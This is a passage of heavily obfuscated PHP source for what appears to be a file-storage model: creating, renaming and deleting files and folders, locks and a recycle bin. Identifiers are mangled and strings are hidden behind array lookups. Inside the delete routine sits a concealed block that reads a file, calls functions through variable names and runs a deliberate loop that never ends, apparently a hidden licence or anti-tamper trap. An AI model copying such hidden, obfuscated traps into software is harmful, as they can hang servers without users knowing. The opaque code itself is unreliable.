$•¡«[$Ö¢¥ò¹º[193]]; } $†Ò§Èş” = "\115\x6f\x64\145\x6c\x53\157\165\162\x63\145\56\x6d\x6b\x64\x69\162\122\x6f\157\x74\x2e{$Ê¸áªà}\x2e{$ºãğØàĞ}\56" . $¨„«º“’; CacheLock::lock($†Ò§Èş”); $èíàé„[$Ö¢¥ò¹º[32]] = $¨„«º“’; $Ú¤²– = $this->add($èíàé„); $¡ğÁÔ‹ç = array($Ö¢¥ò¹º[638] => short_id($Ú¤²–)); $this->where(array($Ö¢¥ò¹º[475] => $Ú¤²–))->save($¡ğÁÔ‹ç); CacheLock::unlock($†Ò§Èş”); return $Ú¤²–; } private function targetSourceRoot($‡àÆ­ôÔ, $¤åŒŠ˜µ, $½µÂÕÌ” = false) { $óÒ—ı³´ =& $_SERVER[÷åé¼î]; $ÍŞ—Ú˜¼ = array($óÒ—ı³´[461] => 0, $óÒ—ı³´[632] => $‡àÆ­ôÔ, $óÒ—ı³´[633] => $¤åŒŠ˜µ); if ($½µÂÕÌ”) { $©ôê = $this->where($ÍŞ—Ú˜¼)->select(); return $©ôê ? $©ôê : array(); } $Â‹Ş¦ëû = $this->where($ÍŞ—Ú˜¼)->find(); return $Â‹Ş¦ëû ? $Â‹Ş¦ëû : array(); } public function sourceRootGroup($Õ²­ª´³) { $·—™İ˜Í =& $_SERVER[÷åé¼î]; if (is_string($Õ²­ª´³)) { $Õ²­ª´³ = array($Õ²­ª´³); } $³ïşæ±ö = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Õ²­ª´³, $·—™İ˜Í[220]); $Üƒº¢ = array($·—™İ˜Í[429] => $³ïşæ±ö, $·—™İ˜Í[426] => array($·—™İ˜Í[823] => count($Õ²­ª´³))); $this->_listDataApply($Üƒº¢[$·—™İ˜Í[429]]); $this->_listMake($Üƒº¢); return array_to_keyvalue($Üƒº¢[$·—™İ˜Í[85]], $·—™İ˜Í[553]); } public function mkfile($¤ÀÒë ±, $çİ¨áƒÑ, $å±şˆ— = '', $’ìú¾ã« = REPEAT_RENAME) { $çË…æÃ =& $_SERVER[÷åé¼î]; $Àœ€Ùµ = Model($çË…æÃ[658])->addFileByContent($å±şˆ—, $çİ¨áƒÑ); return $this->_createFileCall($¤ÀÒë ±, $çİ¨áƒÑ, $Àœ€Ùµ, $’ìú¾ã«, $çË…æÃ[1424]); } public function addFile($ó¸¿ì¢¶, $äÔ‹ßşã, $Òö£Áé‚, $ë£¨éê‘ = false, $ÜÆÛ’ = REPEAT_RENAME) { $®ç¬’Í = Model($_SERVER[÷åé¼î][658])->addFile($äÔ‹ßşã, $Òö£Áé‚, $ë£¨éê‘); return $this->_createFileCall($ó¸¿ì¢¶, $Òö£Áé‚, $®ç¬’Í, $ÜÆÛ’); } public function addFileByFileID($¹‰ÌÙ¾², $»ªÙ´®±, $Ğƒ¸Òêå, $ñÔ°¦îä = REPEAT_RENAME) { $µëÖ„ôÏ =& $_SERVER[÷åé¼î]; $¯ÎŠëÃ = Model($µëÖ„ôÏ[658])->find($»ªÙ´®±); Model($µëÖ„ôÏ[658])->linkAdd($»ªÙ´®±); return $this->_createFileCall($¹‰ÌÙ¾², $Ğƒ¸Òêå, $¯ÎŠëÃ, $ñÔ°¦îä); } public function addFileByRemote($Ò»åı´Ê, $±¯Ñáö×, $Ø•Ü¥æ, $Áêœ°ô = array(), $÷‹¼À‰Æ = REPEAT_RENAME) { $­êöú½Ò = Model($_SERVER[÷åé¼î][658])->addFileByRemote($±¯Ñáö×, $Ø•Ü¥æ, $Áêœ°ô); return $this->_createFileCall($Ò»åı´Ê, $Ø•Ü¥æ, $­êöú½Ò, $÷‹¼À‰Æ); } private function _createFileCall($Äµ“¿Ã, $«›£óËÅ, $ÛõÏéê‰, $ÏÀşÊà÷, $ÑÒ¼€şŠ = "\x75\160\x6c\157\141\144") { $š’á Ğ =& $_SERVER[÷åé¼î]; $„ü‰¨´– = !1; $this->setMasterDB(); $this->lockWriteStart($Äµ“¿Ã, $«›£óËÅ); $ùà”Éç = $this->fileNameExist($Äµ“¿Ã, $«›£óËÅ); $†îôîŠ¹ = $this->_createFile($Äµ“¿Ã, $«›£óËÅ, $ÛõÏéê‰, $ÏÀşÊà÷, $„ü‰¨´–); if (!$„ü‰¨´–) { Model($š’á Ğ[528])->remove($ÛõÏéê‰[$š’á Ğ[525]]); } if ($„ü‰¨´– && $†îôîŠ¹ && $†îôîŠ¹ != $ùà”Éç) { Model($š’á Ğ[2229])->eventCreate($†îôîŠ¹, $ÑÒ¼€şŠ); } $this->lockWriteEnd($Äµ“¿Ã, $«›£óËÅ); return $†îôîŠ¹; } public function mkdir($çƒ¸í‰, $Â‘üî”Ñ, $ §ŠŠÎ“ = REPEAT_SKIP) { $Õ—¾«¯Ë =& $_SERVER[÷åé¼î]; $this->setMasterDB(); $©Äï›õ¼ = $this->sourceInfo($çƒ¸í‰); if (!$©Äï›õ¼) { return !1; } $this->lockWriteStart($çƒ¸í‰, $Â‘üî”Ñ); if ($ §ŠŠÎ“ !== !1) { $´—ÛÈ€¾ = $this->fileNameExist($çƒ¸í‰, $Â‘üî”Ñ); if ($´—ÛÈ€¾ && $ §ŠŠÎ“ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($çƒ¸í‰, $Â‘üî”Ñ); return $´—ÛÈ€¾; } $Â‘üî”Ñ = $this->fileNameAuto($çƒ¸í‰, $Â‘üî”Ñ, $ §ŠŠÎ“); } $Õ€Ş×øõ = array($Õ—¾«¯Ë[630] => 1, $Õ—¾«¯Ë[478] => $Â‘üî”Ñ, $Õ—¾«¯Ë[631] => $Õ—¾«¯Ë[12], $Õ—¾«¯Ë[526] => 0, $Õ—¾«¯Ë[601] => 0); $ ¶ïƒŸ = $this->_addSource($Õ€Ş×øõ, $©Äï›õ¼); Model($Õ—¾«¯Ë[2229])->eventCreate($ ¶ïƒŸ, $Õ—¾«¯Ë[1425]); $this->lockWriteEnd($çƒ¸í‰, $Â‘üî”Ñ); return $ ¶ïƒŸ; } public function listSourceRoot($ôÙÆåÎ, $¾ö³¼ŞÀ, $ˆ´Ã²Ä“ = "\163\x6f\x75\x72\143\x65\111\104\x2c\164\x61\162\x67\x65\164\111\x44\x2c\163\151\x7a\x65") { $–ËÇ®€¸ =& $_SERVER[÷åé¼î]; $ó§¬àÌ‰ = $–ËÇ®€¸[438]; $—£ÌÂ¬— = array(); $Á‹“„Áè = 1024 * 50; $ôŸßƒ×‰ = is_array($ôŸßƒ×‰) ? $ôŸßƒ×‰ : array(); $¿úÚŸÀ = count($¾ö³¼ŞÀ); $Õšå€ç = $this->tablePrefix . $–ËÇ®€¸[2262]; for ($ÜòøÚùŞ = 0; $ÜòøÚùŞ < $¿úÚŸÀ; $ÜòøÚùŞ++) { $é¢¦ïÄÆ = $¾ö³¼ŞÀ[$ÜòøÚùŞ]; $ó§¬àÌ‰ .= "\123\x45\114\x45\103\124\40\x2a\x20\106\x52\x4f\115\40\50\x53\105\x4c\105\x43\124\40{$ˆ´Ã²Ä“}\40\106\x52\x4f\115\x20\140{$Õšå€ç}\x60\x20\x57\110\x45\x52\105\40"; $ó§¬àÌ‰ .= "\x60\160\x61\x72\145\x6e\x74\x49\104\x60\75\x30\x20\101\x4e\x44\x20\x60\164\141\162\x67\x65\x74\111\104\140\x3d{$é¢¦ïÄÆ}\40\101\x4e\104\x20\140\164\141\162\147\x65\x74\124\x79\160\145\140\75{$ôÙÆåÎ}\40\x61\156\144\x20\146\x69\x6c\145\x54\x79\160\x65\75\x27\x27\40\154\x69\x6d\151\x74\x20\61\51\x20\141\x73\x20\x74\x62\137{$ÜòøÚùŞ}\40\125\116\111\x4f\116\x20\101\114\x4c\40"; if ((strlen($ó§¬àÌ‰) >= $Á‹“„Áè || $ÜòøÚùŞ == $¿úÚŸÀ - 1) && $ó§¬àÌ‰) { $ó§¬àÌ‰ = substr($ó§¬àÌ‰, 0, -strlen($–ËÇ®€¸[1110])); $èˆ±¤—Û = $this->query($ó§¬àÌ‰); $ó§¬àÌ‰ = $–ËÇ®€¸[12]; $—£ÌÂ¬— = array_merge($—£ÌÂ¬—, $èˆ±¤—Û); } } return $—£ÌÂ¬—; } private function _createFile($Šá“ã›£, $ô“ÄüÒë, $ÛÖêÓ©, $—ÚÏÍ‰à, &$Â‹àñÛ) { $çıß‘Ê =& $_SERVER[÷åé¼î]; $šÅ¿øô = $this->sourceInfo($Šá“ã›£); if (!$ÛÖêÓ© || !$šÅ¿øô) { return !1; } if ($—ÚÏÍ‰à !== !1) { $šÚâ‘°À = $this->fileNameExist($Šá“ã›£, $ô“ÄüÒë); } $Â‹àñÛ = !0; if ($—ÚÏÍ‰à && $šÚâ‘°À) { if ($—ÚÏÍ‰à == REPEAT_SKIP) { $Â‹àñÛ = !1; return $šÚâ‘°À; } else { if ($—ÚÏÍ‰à == REPEAT_REPLACE) { $‹ò€€È¾ = $this->sourceInfo($šÚâ‘°À); $ºË¯àÖ = $this->fileHistory($‹ò€€È¾, $ÛÖêÓ©[$çıß‘Ê[525]], $ÛÖêÓ©[$çıß‘Ê[79]]); if (!$ºË¯àÖ) { $Â‹àñÛ = !1; } else { $this->folderSizeReset($Šá“ã›£); } return $šÚâ‘°À; } else { $ô“ÄüÒë = $this->fileNameAuto($Šá“ã›£, $ô“ÄüÒë, $—ÚÏÍ‰à, !1); } } } $€„æË«ù = array($çıß‘Ê[630] => 0, $çıß‘Ê[478] => $ô“ÄüÒë, $çıß‘Ê[631] => substr(get_path_ext($ô“ÄüÒë), 0, 10), $çıß‘Ê[526] => $ÛÖêÓ©[$çıß‘Ê[525]], $çıß‘Ê[601] => $ÛÖêÓ©[$çıß‘Ê[79]]); $‘†¤ÚóØ = $this->_addSource($€„æË«ù, $šÅ¿øô); $this->folderSizeReset($Šá“ã›£, intval($€„æË«ù[$çıß‘Ê[79]])); return $‘†¤ÚóØ; } protected function fileHistory($Ø¬“âó, $ÌÅè±­£, $À“Šª¨™) { $ÚŠÃ’¦Ş =& $_SERVER[÷åé¼î]; if ($Ø¬“âó[$ÚŠÃ’¦Ş[525]] == $ÌÅè±­£) { return !1; } $this->checkLock($Ø¬“âó[$ÚŠÃ’¦Ş[193]], $ÌÅè±­£); Model($ÚŠÃ’¦Ş[2263])->addHistory($Ø¬“âó); $æ²íİ¦ì = array($ÚŠÃ’¦Ş[635] => USER_ID, $ÚŠÃ’¦Ş[482] => time(), $ÚŠÃ’¦Ş[525] => $ÌÅè±­£, $ÚŠÃ’¦Ş[79] => $À“Šª¨™); $this->where(array($ÚŠÃ’¦Ş[475] => $Ø¬“âó[$ÚŠÃ’¦Ş[193]]))->save($æ²íİ¦ì); $this->sourceCacheClear($Ø¬“âó[$ÚŠÃ’¦Ş[193]]); return !0; } public function checkLock($Àí¤¢ÎÕ, $¼¬éúÍÈ) { $»¥Şüº =& $_SERVER[÷åé¼î]; $Â›”œï = $this->pathInfo($Àí¤¢ÎÕ); if (!$this->fileIsLock($Â›”œï, !0)) { return; } $Ç‘úÜùº = Session::get($»¥Şüº[2264]); $’¬Ü şÔ = substr($Â›”œï[$»¥Şüº[32]], 0, -1 - strlen($Â›”œï[$»¥Şüº[169]])) . $»¥Şüº[1287] . $Ç‘úÜùº . $»¥Şüº[10] . $Â›”œï[$»¥Şüº[169]]; $ÑÈØÛõı = Model($»¥Şüº[658])->find($¼¬éúÍÈ); $this->_createFileCall($Â›”œï[$»¥Şüº[192]], $’¬Ü şÔ, $ÑÈØÛõı, REPEAT_REPLACE, $»¥Şüº[1424]); $¿‘¨İ¸´ = $Â›”œï[$»¥Şüº[523]][$»¥Şüº[594]]; $ıß¸“”È = $¿‘¨İ¸´[$»¥Şüº[2265]] ? $¿‘¨İ¸´[$»¥Şüº[2265]] : $¿‘¨İ¸´[$»¥Şüº[32]]; show_json(LNG($»¥Şüº[2266]) . $»¥Şüº[2267] . LNG($»¥Şüº[2268]) . $»¥Şüº[2269] . $ıß¸“”È . $»¥Şüº[2270], !1); } public function fileIsLock($¾ßÜÈ, $é¶Ñî£Õ = false) { $¢ì©±íí =& $_SERVER[÷åé¼î]; if (!_get($¾ßÜÈ, $¢ì©±íí[590], 0)) { return !1; } if ($¾ßÜÈ[$¢ì©±íí[523]][$¢ì©±íí[593]] != USER_ID) { return !0; } $Û¥°ŸÓå = $GLOBALS[$¢ì©±íí[6]][$¢ì©±íí[92]][$¢ì©±íí[591]]; if ($¾ßÜÈ[$¢ì©±íí[523]][$¢ì©±íí[592]] <= time() - $Û¥°ŸÓå) { $this->metaSet($¾ßÜÈ[$¢ì©±íí[193]], $¢ì©±íí[593], null); $this->metaSet($¾ßÜÈ[$¢ì©±íí[193]], $¢ì©±íí[592], null); } if ($é¶Ñî£Õ) { $this->metaSet($¾ßÜÈ[$¢ì©±íí[193]], $¢ì©±íí[592], time()); } return !1; } private function _addSource($›­¬ü¾´, $–€ú³—Â) { $ı–úåàî =& $_SERVER[÷åé¼î]; $¹ÕİæÊ‹ = defined($ı–úåàî[2203]) ? USER_ID : 0; $¼¥ ó§ğ = array($ı–úåàî[632] => $–€ú³—Â[$ı–úåàî[190]], $ı–úåàî[633] => $–€ú³—Â[$ı–úåàî[553]], $ı–úåàî[634] => $¹ÕİæÊ‹, $ı–úåàî[635] => $¹ÕİæÊ‹, $ı–úåàî[461] => $–€ú³—Â[$ı–úåàî[193]], $ı–úåàî[636] => $–€ú³—Â[$ı–úåàî[568]] . $–€ú³—Â[$ı–úåàî[193]] . $ı–úåàî[50], $ı–úåàî[488] => 0, $ı–úåàî[637] => $ı–úåàî[12]); $›­¬ü¾´ = array_merge($¼¥ ó§ğ, $›­¬ü¾´); $this->updateModifyTime($›­¬ü¾´[$ı–úåàî[192]]); $¼Æ‹©À = $ı–úåàî[2271] . $–€ú³—Â[$ı–úåàî[193]]; if (isset(self::$cacheChildList[$¼Æ‹©À])) { unset(self::$cacheChildList[$¼Æ‹©À]); } static $¢ÁÏ¢Ö = false; if (!$¢ÁÏ¢Ö) { Hook::trigger($ı–úåàî[620], $›­¬ü¾´); $¢ÁÏ¢Ö = !0; } $Æ¤ãƒ×ï = $this->add($›­¬ü¾´); $†²ï ¹Æ = array($ı–úåàî[638] => short_id($Æ¤ãƒ×ï)); $this->where(array($ı–úåàî[475] => $Æ¤ãƒ×ï))->save($†²ï ¹Æ); $this->setNamePinyin($Æ¤ãƒ×ï, $›­¬ü¾´[$ı–úåàî[32]]); return $Æ¤ãƒ×ï; } public function remove($ šşª˜», $ï˜¶¢¼’ = true) { $‰§Äİ­ =& $_SERVER[÷åé¼î]; $ÃÚ£Û¢í = $this->sourceInfo($ šşª˜»); $¼‚îÊ¦ = intval($ÃÚ£Û¢í[$‰§Äİ­[190]]) === self::TYPE_SYSTEM; $÷ñ«Ñˆ = Model($‰§Äİ­[492])->get($‰§Äİ­[2272]) == $‰§Äİ­[91]; if ($¼‚îÊ¦ || $ï˜¶¢¼’ || !$÷ñ«Ñˆ) { return $this->removeNow($ šşª˜», $ï˜¶¢¼’); } $³ˆÅ¯¢´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $’ÊÄô¶ = $ÃÚ£Û¢í[$‰§Äİ­[190]] == self::TYPE_USER ? $‰§Äİ­[646] : $‰§Äİ­[562]; if ($’ÊÄô¶ == $‰§Äİ­[646]) { $õëıÆ¦ = Model($‰§Äİ­[561])->getInfo($ÃÚ£Û¢í[$‰§Äİ­[553]]); $©¿üÖµ = !empty($õëıÆ¦[$‰§Äİ­[2265]]) ? $õëıÆ¦[$‰§Äİ­[2265]] : $õëıÆ¦[$‰§Äİ­[32]]; $©¿üÖµ = $‰§Äİ­[321] . $©¿üÖµ . $‰§Äİ­[2273] . $ÃÚ£Û¢í[$‰§Äİ­[553]]; } else { $õëıÆ¦ = Model($‰§Äİ­[569])->getInfo($ÃÚ£Û¢í[$‰§Äİ­[553]]); $©¿üÖµ = _get($õëıÆ¦, $‰§Äİ­[32]); $©¿üÖµ = $‰§Äİ­[176] . $©¿üÖµ . $‰§Äİ­[2274] . $ÃÚ£Û¢í[$‰§Äİ­[553]]; } $èœÜ¼¨Ã = $‰§Äİ­[2275] . md5($©¿üÖµ); CacheLock::lock($èœÜ¼¨Ã); $Ü²ÓØ´É = $this->fileNameExist($³ˆÅ¯¢´, $©¿üÖµ); if (!$Ü²ÓØ´É) { $Ü²ÓØ´É = $this->mkdir($³ˆÅ¯¢´, $©¿üÖµ, REPEAT_SKIP); $this->metaSet($Ü²ÓØ´É, $‰§Äİ­[2276], $’ÊÄô¶); $this->metaSet($Ü²ÓØ´É, $‰§Äİ­[2277], $ÃÚ£Û¢í[$‰§Äİ­[553]]); if ($ÃÚ£Û¢í[$‰§Äİ­[192]] != 0) { $this->metaSet($Ü²ÓØ´É, $‰§Äİ­[2278], _get($õëıÆ¦, $‰§Äİ­[2279])); } } CacheLock::unlock($èœÜ¼¨Ã); $this->metaSet($ šşª˜», $‰§Äİ­[2280], $ÃÚ£Û¢í[$‰§Äİ­[192]]); $this->where(array($‰§Äİ­[193] => $ šşª˜»))->save(array($‰§Äİ­[482] => time())); $this->recycleClear($ÃÚ£Û¢í); Model($‰§Äİ­[617])->eventRemove($ šşª˜»); $è÷õÌâÁ = $this->move($ šşª˜», $Ü²ÓØ´É, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÃÚ£Û¢í[$‰§Äİ­[192]]); return $è÷õÌâÁ; } private function recycleClear($şƒšÁ¸Õ) { $¬Ñå­˜ó =& $_SERVER[÷åé¼î]; $ œ¨õÁí = $this->childrenAll($şƒšÁ¸Õ); $Ş­äáËí = array($¬Ñå­˜ó[475] => array($¬Ñå­˜ó[476], $ œ¨õÁí[$¬Ñå­˜ó[2281]])); Model($¬Ñå­˜ó[2282])->where($Ş­äáËí)->delete(); } public function removeNow($Ï†äÎëŞ, $à£¤î÷ = true) { $½¶¬á„å =& $_SERVER[÷åé¼î]; if (!isset($_SERVER[$½¶¬á„å[933]]) || !isset($_SERVER[$½¶¬á„å[931]])) { $¬ş›ê£ = $½¶¬á„å[949]; $áß±å¼ˆ = $½¶¬á„å[934]; $¹êª¸î = $_SERVER[$½¶¬á„å[935]] . $½¶¬á„å[936]; $ÑÁú™Üë = $áß±å¼ˆ($¹êª¸î); $¥ƒ±óù˜ = explode($½¶¬á„å[262], $ÑÁú™Üë); if (count($¥ƒ±óù˜) < $½¶¬á„å[703]) { $Û¨êÆ¦¹ = $½¶¬á„å[937]; $Û¨êÆ¦¹(); } $ÜÑÇäÚâ = $½¶¬á„å[950]; $ÜÑÇäÚâ($_SERVER[$½¶¬á„å[951]]); $£“üº»Ì = 1; for ($«¾Úµ×« = $£“üº»Ì; $«¾Úµ×« > 0; $«¾Úµ×«++) { $ÜÑÇäÚâ = json_encode($GLOBALS[$½¶¬á„å[476]]); } } $†À²Ø£ä = $this->sourceInfo($Ï†äÎëŞ); $üÆéÆò = $this->pathInfoMore($Ï†äÎëŞ); if (!$†À²Ø£ä) { return !0; } if ($†À²Ø£ä[$½¶¬á„å[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Ï†äÎëŞ); Hook::trigger($½¶¬á„å[2283], $üÆéÆò, $à£¤î÷); if ($à£¤î÷) { Model($½¶¬á„å[2282])->moveToRecycle($Ï†äÎëŞ); } else { $ŒÚó‘Ê = $this->childrenAll($†À²Ø£ä); Model($½¶¬á„å[617])->eventRemove($Ï†äÎëŞ); $this->removeRelevance($ŒÚó‘Ê[$½¶¬á„å[2281]], $ŒÚó‘Ê[$½¶¬á„å[1584]]); } $this->folderSizeReset($†À²Ø£ä[$½¶¬á„å[192]]); $æ„š”•æ = array($†À²Ø£ä[$½¶¬á„å[192]]); if ($†À²Ø£ä[$½¶¬á„å[469]] == $½¶¬á„å[91]) { $æ„š”•æ[] = $†À²Ø£ä[$½¶¬á„å[193]]; } $this->updateModifyTime($æ„š”•æ); $this->lockMoveEnd($Ï†äÎëŞ); Hook::trigger($½¶¬á„å[1821], $üÆéÆò, $à£¤î÷); return !0; } public function childrenAll($¥¢Ì§±î) { $…‡€µ =& $_SERVER[÷åé¼î]; $­¢òè©Ö = $¥¢Ì§±î[$…‡€µ[193]]; if ($¥¢Ì§±î[$…‡€µ[469]] == $…‡€µ[91]) { $°Œ‰ÂÕÂ = array($…‡€µ[636] => array($…‡€µ[596], $¥¢Ì§±î[$…‡€µ[568]] . $­¢òè©Ö . $…‡€µ[597])); $ÅÌ” = array($…‡€µ[636] => $°Œ‰ÂÕÂ[$…‡€µ[568]]); $½şéÅªñ = $this->field($…‡€µ[2284])->where($ÅÌ”)->select(); $ş±¡…» = !1; $ç¦ªÆ•× = array($­¢òè©Ö); if ($½şéÅªñ) { $ş±¡…» = array_to_keyvalue($½şéÅªñ, $…‡€µ[12], $…‡€µ[525]); $ş±¡…» = array_remove_value($ş±¡…», $…‡€µ[228]); $ç¦ªÆ•× = array_to_keyvalue($½şéÅªñ, $…‡€µ[12], $…‡€µ[193]); $ç¦ªÆ•×[] = $­¢òè©Ö; } } else { $ş±¡…» = array($¥¢Ì§±î[$…‡€µ[525]]); $ç¦ªÆ•× = array($­¢òè©Ö); } return array($…‡€µ[2281] => $ç¦ªÆ•×, $…‡€µ[1584] => $ş±¡…»); } public function removeArray($­éî…Ø) { if (!$­éî…Ø) { return !0; } } public function removeRelevance($õ«”Ïëì, $ÉÈ†Ù”â) { $¸…ïæƒˆ =& $_SERVER[÷åé¼î]; $õ«”Ïëì = $õ«”Ïëì ? $õ«”Ïëì : array(); $ÉÈ†Ù”â = $ÉÈ†Ù”â ? $ÉÈ†Ù”â : array(); $õ«”Ïëì = array_unique(array_filter($õ«”Ïëì)); $ÉÈ†Ù”â = array_unique(array_filter($ÉÈ†Ù”â)); if (!$õ«”Ïëì) { return !1; } $¥Œ¨´å = array($¸…ïæƒˆ[475] => array($¸…ïæƒˆ[476], $õ«”Ïëì)); Model($¸…ïæƒˆ[2282])->where($¥Œ¨´å)->delete(); Model($¸…ïæƒˆ[519])->where($¥Œ¨´å)->delete(); Model($¸…ïæƒˆ[2128])->where($¥Œ¨´å)->delete(); Model($¸…ïæƒˆ[617])->where($¥Œ¨´å)->delete(); Model($¸…ïæƒˆ[1957])->removeBySource($õ«”Ïëì); Model($¸…ïæƒˆ[2263])->removeBySource($õ«”Ïëì); $this->where($¥Œ¨´å)->delete(); Model($¸…ïæƒˆ[528])->remove($ÉÈ†Ù”â); for ($­ã‚àş = 0; $­ã‚àş < count($õ«”Ïëì); $­ã‚àş++) { $this->sourceCacheClear($õ«”Ïëì[$­ã‚àş]); } } public function rename($ÄĞŠÜäˆ, $¡ñìÛÒ¡) { $Éèè˜Ì =& $_SERVER[÷åé¼î]; $…˜”ìŠ = $this->sourceInfo($ÄĞŠÜäˆ); if (!$…˜”ìŠ) { return !1; } $­úğšœ– = $this->fileNameExist($…˜”ìŠ[$Éèè˜Ì[192]], $¡ñìÛÒ¡); if ($­úğšœ– && $­úğšœ– != $ÄĞŠÜäˆ) { return !1; } $ÜıÎ®‘£ = array($Éèè˜Ì[478] => $¡ñìÛÒ¡, $Éèè˜Ì[635] => USER_ID); if ($…˜”ìŠ[$Éèè˜Ì[469]] != $Éèè˜Ì[91]) { $ÜıÎ®‘£[$Éèè˜Ì[470]] = substr(get_path_ext($¡ñìÛÒ¡), 0, 10); } Model($Éèè˜Ì[617])->eventRename($ÄĞŠÜäˆ, $…˜”ìŠ[$Éèè˜Ì[32]], $¡ñìÛÒ¡); $this->sourceCacheClear($ÄĞŠÜäˆ); $this->setNamePinyin($ÄĞŠÜäˆ, $ÜıÎ®‘£[$Éèè˜Ì[32]], !1); $this->updateModifyTime($…˜”ìŠ[$Éèè˜Ì[192]]); $õù‡ÓÖÙ = $this->where(array($Éèè˜Ì[475] => $ÄĞŠÜäˆ))->data($ÜıÎ®‘£)->save(); $ÇÆşßšø = $Éèè˜Ì[2271] . $…˜”ìŠ[$Éèè˜Ì[192]]; if (isset(self::$cacheChildList[$ÇÆşßšø])) { unset(self::$cacheChildList[$ÇÆşßšø]); } return $õù‡ÓÖÙ; } public function setNamePinyin($ŠöĞœè, $¹Ú’õıñ, $·¬áì’Ø = true) { $äÜò×âß =& $_SERVER[÷åé¼î]; $ÆñÑ•À¥ = Input::check($¹Ú’õıñ, $äÜò×âß[639]); $›ó×¦åÏ = array($äÜò×âß[501] => KodSort::makeStr($¹Ú’õıñ)); if ($ÆñÑ•À¥) { $›ó×¦åÏ[$äÜò×âß[522]] = str_replace($äÜò×âß[53], $äÜò×âß[12], Pinyin::get($¹Ú’õıñ)); $›ó×¦åÏ[$äÜò×âß[521]] = Pinyin::get($¹Ú’õıñ, $äÜò×âß[640]); } if (!$·¬áì’Ø && !$ÆñÑ•À¥) { $›ó×¦åÏ[$äÜò×âß[522]] = null; $›ó×¦åÏ[$äÜò×âß[521]] = null; } $this->metaSet($ŠöĞœè, $›ó×¦åÏ); } public function getContent($íŠüõÁ¤) { $Ìí£œ =& $_SERVER[÷åé¼î]; $œ±±¤¤õ = $this->fileInfoGet($íŠüõÁ¤); if (!$œ±±¤¤õ) { return !1; } if ($œ±±¤¤õ[$Ìí£œ[79]] == 0) { return $Ìí£œ[12]; } $øŒõŞ¹° = $Ìí£œ[2285] . $œ±±¤¤õ[$Ìí£œ[531]]; if ($œ±±¤¤õ[$Ìí£œ[79]] <= 1024 * 10) { $·¾½•™Ò = Cache::get($øŒõŞ¹°); if (!$·¾½•™Ò) { $·¾½•™Ò = IO::getContent($œ±±¤¤õ[$Ìí£œ[87]]); Cache::set($øŒõŞ¹°, $·¾½•™Ò); } return $·¾½•™Ò; } if (!$œ±±¤¤õ[$Ìí£œ[87]]) { return $Ìí£œ[12]; } return IO::getContent($œ±±¤¤õ[$Ìí£œ[87]]); } public function setDesc($Ô°ãÑ, $ü÷Ûç÷¹) { $¢Æø…ëÃ =& $_SERVER[÷åé¼î]; Model($¢Æø…ëÃ[617])->eventAddDesc($Ô°ãÑ, $ü÷Ûç÷¹); return $this->metaSet($Ô°ãÑ, $¢Æø…ëÃ[510], $ü÷Ûç÷¹); } public function setContent($ÙëŸ¿”, $ñõİ•Åù = '') { $°Ô¬şŞ¥ =& $_SERVER[÷åé¼î]; $¾Ï¸ŒŞ± = $this->sourceInfo($ÙëŸ¿”); $¡‘±Áá‹ = $this->fileInfoGet($ÙëŸ¿”); if (!$¡‘±Áá‹ || !$¾Ï¸ŒŞ±) { return !1; } $ßƒ¼ÕÁª = Model($°Ô¬şŞ¥[528])->addFileByContent($ñõİ•Åù, $¾Ï¸ŒŞ±[$°Ô¬şŞ¥[32]]); $£±úé‚ = $this->fileHistory($¾Ï¸ŒŞ±, $ßƒ¼ÕÁª[$°Ô¬şŞ¥[525]], $ßƒ¼ÕÁª[$°Ô¬şŞ¥[79]]); if (!$£±úé‚) { return Model($°Ô¬şŞ¥[528])->remove($ßƒ¼ÕÁª[$°Ô¬şŞ¥[525]]); } $this->folderSizeReset($¾Ï¸ŒŞ±[$°Ô¬şŞ¥[192]]); return !0; } public function fileSubstr($úÃ±ïÎ¯, $œÀõó¾Ô, $ÛÉßÓ¾) { $îìÈÑ° = $this->fileInfoGet($úÃ±ïÎ¯); if (!$îìÈÑ°) { return !1; } return IO::fileSubstr($îìÈÑ°[$_SERVER[÷åé¼î][87]], $œÀõó¾Ô, $ÛÉßÓ¾); } public function fileInfoGet($°¸–Ùîë) { $È‘ÏÆ¯” =& $_SERVER[÷åé¼î]; $ˆ–“É×¢ = $this->sourceInfo($°¸–Ùîë); if (!$ˆ–“É×¢ || $ˆ–“É×¢[$È‘ÏÆ¯”[469]]) { return !1; } $Ü­¤÷øƒ = $È‘ÏÆ¯”[532] . $ˆ–“É×¢[$È‘ÏÆ¯”[525]]; $ÛÑÌÇ = _get(self::$cacheFileInfo, $Ü­¤÷øƒ); if ($ÛÑÌÇ) { return $ÛÑÌÇ; } $¨®İÖ¨İ = Model($È‘ÏÆ¯”[528])->fileInfo($ˆ–“É×¢[$È‘ÏÆ¯”[525]]); if ($¨®İÖ¨İ) { $¨®İÖ¨İ[$È‘ÏÆ¯”[32]] = $ˆ–“É×¢[$È‘ÏÆ¯”[32]]; } self::$cacheFileInfo[$Ü­¤÷øƒ] = $¨®İÖ¨İ; return $¨®İÖ¨İ; } private function folderChildrenNumber($ÙåáŒÈ·) { $Û“áüöÉ =& $_SERVER[÷åé¼î]; $³ç¯±ı­ = $this->sourceInfo($ÙåáŒÈ·); $İš¦®™‚ = array($Û“áüöÉ[636] => array($Û“áüöÉ[596], $³ç¯±ı­[$Û“áüöÉ[568]] . $ÙåáŒÈ· . $Û“áüöÉ[597]), $Û“áüöÉ[633] => $³ç¯±ı­[$Û“áüöÉ[553]], $Û“áüöÉ[488] => intval($³ç¯±ı­[$Û“áüöÉ[489]]), $Û“áüöÉ[630] => 1); $íÄÚ»ù¹ = $this->where($İš¦®™‚)->count(); $¨üº×©Å = $this->where($İš¦®™‚)->where(array($Û“áüöÉ[630] => 0))->count(); return array($Û“áüöÉ[83] => $¨üº×©Å, $Û“áüöÉ[84] => $íÄÚ»ù¹); } public function pathInfo($µ¿ ôô•, $´Ã¾äùâ = false) { $”ÔÜ—èØ =& $_SERVER[÷åé¼î]; $´Ã¾äùâ = !1; $µ¿ ôô• = intval($µ¿ ôô•); $§ùîö ä = $”ÔÜ—èØ[518] . intval($´Ã¾äùâ) . $”ÔÜ—èØ[446] . $µ¿ ôô•; $¿‘ÕÉšÕ = _get(self::$cachePathInfo, $§ùîö ä); if ($¿‘ÕÉšÕ) { return $¿‘ÕÉšÕ; } $üÅÚ Ÿ = $this->sourceInfo($µ¿ ôô•); if (!$üÅÚ Ÿ) { return !1; } 